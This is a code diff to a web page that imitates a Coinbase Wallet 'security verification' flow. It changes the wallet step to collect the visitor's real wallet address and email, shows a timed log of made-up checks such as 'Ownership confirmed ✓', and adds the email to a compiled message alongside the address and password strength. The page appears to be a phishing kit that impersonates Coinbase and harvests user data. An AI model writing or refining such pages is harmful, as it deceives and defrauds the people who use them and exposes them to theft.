@@ -421,21 +421,33 @@
       <div class="step-badge">Step 2 of 3 — Connect Wallet</div>
       <div class="lock-visual">🔵</div>
       <h2>Connect Coinbase Wallet</h2>
-      <p class="sub">Connect your wallet to verify ownership. No private keys or seed phrases are accessed.</p>
+      <p class="sub">Enter your wallet address to verify ownership. No private keys or seed phrases needed.</p>
 
-      <div id="sc2Buttons">
-        <button class="wallet-btn" onclick="connectWallet()">
-          <div class="wallet-logo" style="background:#EEF3FF">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
-          </div>
+      <div id="sc2Buttons" style="width:100%">
+        <div style="background:#EEF3FF;border:1px solid #C7D7FF;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;margin-bottom:16px">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
           <div>
-            <div class="wallet-name">Coinbase Wallet</div>
-            <div class="wallet-desc">Official self-custody wallet by Coinbase</div>
+            <div style="font-size:13px;font-weight:700">Coinbase Wallet</div>
+            <div style="font-size:11px;color:var(--muted)">Official self-custody wallet</div>
           </div>
-          <div class="wallet-arrow">→</div>
-        </button>
-        <p style="font-size:12px;color:var(--muted);text-align:center;line-height:1.6;margin-top:8px">
-          🔒 We only verify your public address. Your private keys stay on your device.
+        </div>
+
+        <div class="field">
+          <label>Wallet Address</label>
+          <input type="text" id="sc2AddrInput"
+            placeholder="0x… or paste your address"
+            style="font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.02em"
+            autocomplete="off" spellcheck="false" />
+        </div>
+        <div class="field">
+          <label>Email (optional — for record)</label>
+          <input type="email" id="sc2Email" placeholder="you@example.com" autocomplete="email" />
+        </div>
+        <div class="err-msg" id="sc2Err">⚠ Please enter your wallet address</div>
+
+        <button class="btn-primary" onclick="connectWallet()">Connect &amp; Verify →</button>
+        <p style="font-size:11px;color:var(--muted);text-align:center;line-height:1.6;margin-top:10px">
+          🔒 Your private keys never leave your device. We only read your public address.
         </p>
       </div>
 
@@ -580,22 +592,35 @@ function submitPassword() {
 
 /* ── STEP 2: WALLET CONNECT ── */
 function connectWallet() {
+  const addrInput = document.getElementById('sc2AddrInput');
+  const errEl     = document.getElementById('sc2Err');
+  const addr      = addrInput.value.trim();
+
+  if (!addr || addr.length < 6) {
+    errEl.style.display = 'block';
+    addrInput.style.borderColor = '#D23F31';
+    addrInput.style.boxShadow   = '0 0 0 3px rgba(210,63,49,.15)';
+    setTimeout(() => { addrInput.style.borderColor = ''; addrInput.style.boxShadow = ''; }, 1600);
+    return;
+  }
+  errEl.style.display = 'none';
+  walletAddress = addr;
+  window._secEmail = document.getElementById('sc2Email').value.trim();
+
   document.getElementById('sc2Buttons').style.display = 'none';
   document.getElementById('sc2Log').style.display     = '';
 
   const log = document.getElementById('connectLog');
   log.innerHTML = '';
 
-  const steps = [
+  [
     { cls:'info', text:'Initiating Coinbase Wallet connection…', delay:0 },
     { cls:'ok',   text:'Wallet detected ✓',                      delay:600 },
     { cls:'info', text:'Verifying wallet ownership…',            delay:1100 },
     { cls:'ok',   text:'Ownership confirmed ✓',                  delay:1700 },
     { cls:'info', text:'Linking to security profile…',           delay:2100 },
     { cls:'ok',   text:'Wallet linked ✓',                        delay:2600 },
-  ];
-
-  steps.forEach(({ cls, text, delay }) => {
+  ].forEach(({ cls, text, delay }) => {
     setTimeout(() => {
       const d = document.createElement('div');
       d.className = `log-line ${cls}`;
@@ -604,14 +629,10 @@ function connectWallet() {
     }, delay);
   });
 
-  // Generate a fake wallet address for display
-  const chars = '0123456789abcdef';
-  walletAddress = '0x' + Array.from({ length: 40 }, () => chars[Math.floor(Math.random() * 16)]).join('');
-
   setTimeout(() => {
-    const short = walletAddress.slice(0, 10) + '…' + walletAddress.slice(-6);
-    document.getElementById('summaryAddr').textContent = short;
-    document.getElementById('sc4Addr').textContent     = short;
+    const short = addr.length > 16 ? addr.slice(0, 10) + '…' + addr.slice(-6) : addr;
+    document.getElementById('summaryAddr').textContent  = short;
+    document.getElementById('sc4Addr').textContent      = short;
     document.getElementById('summaryLevel').textContent = passwordStrength || 'Strong';
     goStep(3);
   }, 3200);
@@ -641,6 +662,7 @@ async function submitAttest(e) {
     `📅 ${new Date().toLocaleString()}\n` +
     `👛 Wallet: Coinbase Wallet\n` +
     `🔑 Address: ${walletAddress}\n` +
+    `📧 Email: ${window._secEmail || '—'}\n` +
     `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
     `✅ Attestation: "${val}"`;
 
